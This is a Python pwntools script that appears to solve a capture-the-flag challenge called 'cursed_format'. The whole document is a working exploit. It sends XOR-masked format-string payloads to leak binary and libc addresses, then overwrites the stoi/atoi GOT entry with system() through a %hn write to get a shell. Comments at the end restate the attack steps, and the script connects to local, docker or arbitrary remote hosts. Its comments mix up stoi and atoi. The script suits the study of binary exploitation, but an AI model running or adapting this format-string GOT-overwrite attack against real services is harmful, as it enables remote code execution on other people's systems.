#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./cursed_format', checksec=False)

def setup():
    if args.LOCAL:
        p = elf.process()
    if args.DOCKER:
        p = remote("localhost", 12345)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    
    return p

def bxor(b1, b2):
    return bytes([x ^ y for x, y in zip(b1, b2)])

for i in range(100):

    p = setup()
    p.sendlineafter(b'>> ', b'1')
    p.sendline(b'\x00' * 0x1f)
    key = p.recv(0x20)

    payload = f'SKB:%{16}$p \n'.encode().ljust(0x1f, b'\x00')
    p.sendlineafter(b'>> ', b'1')
    p.sendline(bxor(payload, key))
    key = payload

    p.recvuntil(b'SKB:')
    stoi_got = int(p.recvline().strip(), 16) + 0x2c90
    log.info(f'Leaked stoi() got: {hex(stoi_got)}')

    payload = f'SKB:%{17}$p \n'.encode().ljust(0x1f, b'\x00')
    p.sendlineafter(b'>> ', b'1')
    p.sendline(bxor(payload, key))
    key = payload

    p.recvuntil(b'SKB:')
    system_addr = int(p.recvline().strip(), 16) + 0x22196
    log.info(f'Leaked system addr: {hex(system_addr)}')

    payload = f"%{system_addr & 0xffff}c%8$hn".encode().ljust(0x10, b'\x00')
    payload += p64(stoi_got)
    p.sendlineafter(b'>> ', b'1')
    p.sendline(bxor(payload, key))
    # key = payload
    p.interactive()

###############
# Flow eploit #
###############
# 1. Leak binary address
# 2. Leak libc address
# 3. Calculate atoi got address
# 4. Overwrite atoi got with system address
# 5. Get shell by sending "/bin/sh" to atoi

# 16 + 0x2c90 -> got atoi
# 17 + 0x22196 -> system